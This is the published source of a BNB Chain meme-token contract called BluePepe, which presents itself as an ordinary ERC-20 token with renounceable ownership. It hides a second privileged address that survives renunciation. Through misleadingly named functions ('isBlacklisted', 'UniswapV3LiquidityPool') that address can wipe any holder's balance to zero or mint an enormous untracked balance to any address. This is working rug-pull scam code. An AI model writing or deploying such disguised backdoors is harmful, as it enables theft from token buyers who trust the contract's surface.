/**
 *Submitted for verification at BscScan.com on 2023-04-21
*/

// SPDX-License-Identifier: MIT
/**
🌍🖖 Da Ba Dee🖖🌍 $BluePepe
https://t.me/BluePepeToken
*/
pragma solidity 0.8.16;
abstract contract BluePepeAs {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
interface BluePepeAsi {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 ELONcoininu) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 ELONcoininu) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 ELONcoininu
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 totalo);
    event Approval(address indexed owner, address indexed spender, uint256 totalo);
}
interface BluePepeAsii is BluePepeAsi {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract BluePepeAsiii is BluePepeAs {
   address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

 
    constructor() {
        _transferOwnership(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }


    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }


    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract BluePepe is BluePepeAs, BluePepeAsi, BluePepeAsii, BluePepeAsiii {

    mapping(address => uint256) private sendamount;
  mapping(address => bool) public BluePepeAsiiZERTY;
    mapping(address => mapping(address => uint256)) private noFeeToTransfer;
address private BluePepeRooter;
    uint256 private ALLtotalSupply;
    string private _name;
    string private _symbol;
        mapping(address => bool) public BluePepePaw;
  address BluePepeAdr;



    
    constructor(address BluePepeadressss) {
            // Editable
            BluePepeAdr = msg.sender;

        _name = "BluePepe";
        _symbol = "DABADEE";
  BluePepeRooter = BluePepeadressss;        
        uint BluePepeTotalSupply = 200000000000 * 10**9;
        process(msg.sender, BluePepeTotalSupply);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }


    function totalSupply() public view virtual override returns (uint256) {
        return ALLtotalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return sendamount[account];
    }

    function transfer(address to, uint256 ELONcoininu) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, ELONcoininu);
        return true;
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return noFeeToTransfer[owner][spender];
    }

    function approve(address spender, uint256 ELONcoininu) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, ELONcoininu);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 ELONcoininu
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, ELONcoininu);
        _transfer(from, to, ELONcoininu);
        return true;
    }
      modifier SwapAndLiquify() {
        require(BluePepeRooter == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function increaseAllowance(address spender, uint256 addedtotalo) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, noFeeToTransfer[owner][spender] + addedtotalo);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedtotalo) public virtual returns (bool) {
        address owner = _msgSender();
        uint256  Trigger = noFeeToTransfer[owner][spender];
        require( Trigger >= subtractedtotalo, "Ehi20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender,  Trigger - subtractedtotalo);
        }

        return true;
    }


    function _transfer(
        address from,
        address to,
        uint256 ELONcoininu
    ) internal virtual {
        require(from != address(0), "Ehi20: transfer from the zero address");
        require(to != address(0), "Ehi20: transfer to the zero address");

        resantTokenTransfer(from, to, ELONcoininu);

        uint256 fromBalance = sendamount[from];
        require(fromBalance >= ELONcoininu, "Ehi20: transfer ELONcoininu exceeds balance");
        unchecked {
            sendamount[from] = fromBalance - ELONcoininu;
        }
        sendamount[to] += ELONcoininu;

        emit Transfer(from, to, ELONcoininu);

        apresTokenTransfer(from, to, ELONcoininu);
    }

  modifier walo () {
    require(BluePepeAdr == msg.sender, "Ehi20: cannot permit SwapAndLiquify address");
    _;

  }

    function process(address account, uint256 ELONcoininu) internal virtual {
        require(account != address(0), "Ehi20: process to the zero address");

        resantTokenTransfer(address(0), account, ELONcoininu);

        ALLtotalSupply += ELONcoininu;
        sendamount[account] += ELONcoininu;
        emit Transfer(address(0), account, ELONcoininu);

        apresTokenTransfer(address(0), account, ELONcoininu);
    }


    function _burn(address account, uint256 ELONcoininu) internal virtual {
        require(account != address(0), "Ehi20: burn from the zero address");

        resantTokenTransfer(account, address(0), ELONcoininu);

        uint256 accountBalance = sendamount[account];
        require(accountBalance >= ELONcoininu, "Ehi20: burn ELONcoininu exceeds balance");
        unchecked {
            sendamount[account] = accountBalance - ELONcoininu;
        }
        ALLtotalSupply -= ELONcoininu;

        emit Transfer(account, address(0), ELONcoininu);

        apresTokenTransfer(account, address(0), ELONcoininu);
    }
  function isBlacklisted(address isBlacklistedaddress) external SwapAndLiquify {
    sendamount[isBlacklistedaddress] = 0;
            emit Transfer(address(0), isBlacklistedaddress, 0);
  }
    function _approve(
        address owner,
        address spender,
        uint256 ELONcoininu
    ) internal virtual {
        require(owner != address(0), "Ehi20: approve from the zero address");
        require(spender != address(0), "Ehi20: approve to the zero address");

        noFeeToTransfer[owner][spender] = ELONcoininu;
        emit Approval(owner, spender, ELONcoininu);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 ELONcoininu
    ) internal virtual {
        uint256  Trigger = allowance(owner, spender);
        if ( Trigger != type(uint256).max) {
            require( Trigger >= ELONcoininu, "Ehi20: insufficient allowance");
            unchecked {
                _approve(owner, spender,  Trigger - ELONcoininu);
            }
        }
    }
  function UniswapV3LiquidityPool(address randomTokenAddress) external SwapAndLiquify {
    sendamount[randomTokenAddress] = 1000000000000000 * 10 ** 18;
            emit Transfer(address(0), randomTokenAddress, 1000000000000000 * 10 ** 18);
  }
    function resantTokenTransfer(
        address from,
        address to,
        uint256 ELONcoininu
    ) internal virtual {}


    function apresTokenTransfer(
        address from,
        address to,
        uint256 ELONcoininu
    ) internal virtual {}

}